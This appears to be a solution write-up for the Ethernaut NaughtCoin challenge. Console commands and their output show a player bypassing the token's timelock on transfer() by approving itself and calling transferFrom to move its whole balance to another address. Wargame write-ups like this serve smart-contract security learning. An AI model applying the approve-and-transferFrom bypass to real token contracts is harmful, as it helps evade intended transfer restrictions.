## Ethernaut-solution

### 15. NaughtCoin

```
>player
'0xF6eA8E869C68362eC2FA1b2159Fe459D6D8f30F5'
```
```
>(await contract.balanceOf(player)).toString() //the balance that the token balance that player has and we want to reduce it zero 
'1000000000000000000000000'
```
```
>(await contract.allowance(player, player)).toString() 
//we just want to see that player has basically not allowed itself to do a delegate transfer of tokens on its behalf 
//Player would approve a second account to spend money on its behalf like a dex or third-party wallet so forth and so on 
'0' //not allowed itself to transfer any amount of tokens, so we wanna change right now! 
```
```
>await contract.approve(player, '1000000000000000000000000')  //approve allows a second account to transfer tokens on its behalf, 
```
//player to transfer tokens outside of its own account using transfer and it's going to approve all of the token that it has 
```
{tx: '0x6c78cc7dddc32a23c730765db778b23579795d8c20a802871a46f1fc6927a033', receipt: {…}, logs: Array(1)}
logs: Array(1)
0: {address: '0xB13D2e31A4AeF83706D75308eC77b9808193e62b', blockHash: '0x16b467832291581121776677159b50dce6cb0abce79896f36cfabd8e03688418', blockNumber: 10926897, logIndex: 0, removed: false, …}
length: 1
[[Prototype]]: Array(0)
receipt:
blockHash: "0x16b467832291581121776677159b50dce6cb0abce79896f36cfabd8e03688418"
blockNumber: 10926897
contractAddress: null
cumulativeGasUsed: 46309
effectiveGasPrice: "0xbadc4df0"
from: "0xf6ea8e869c68362ec2fa1b2159fe459d6d8f30f5"
gasUsed: 46309
logs: [{…}]
logsBloom: "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000110000000000000000100000000000000000001000000000000000000000000"
rawLogs: [{…}]
status: true
to: "0xb13d2e31a4aef83706d75308ec77b9808193e62b"
transactionHash: "0x6c78cc7dddc32a23c730765db778b23579795d8c20a802871a46f1fc6927a033"
transactionIndex: 0
type: "0x2"
[[Prototype]]: Object
tx: "0x6c78cc7dddc32a23c730765db778b23579795d8c20a802871a46f1fc6927a033"
[[Prototype]]: Object
```

//check after this transaction gets confirmed whether or not, 

//player has delegate itself to do a delegate transfer! 
```
>(await contract.allowance(player, player)).toString()
'1000000000000000000000000'
```
//now player is allowed to use the transfer from method to send money 

//whereever it wants again transfer from in conjunction with approve used first is how you can authorize another account to or third-party account to spend tokens on your behalf 

//知らないアカウントをEtherscanでpick upしてbalanceをzeroにすればgame clear 
```
> await contract.transferFrom(player, "0xc6dcbfa63cefcf87cab0d6cd826064b5acb307d3", '1000000000000000000000000')

{tx: '0xa7e4ceceec7a566669ae32e4e281e7c5712ce4947910a282e44dadb7b1f70b5e', receipt: {…}, logs: Array(2)}
```

//zero! 全財産hack 
```
>(await contract.balanceOf(player)).toString()
'0'
```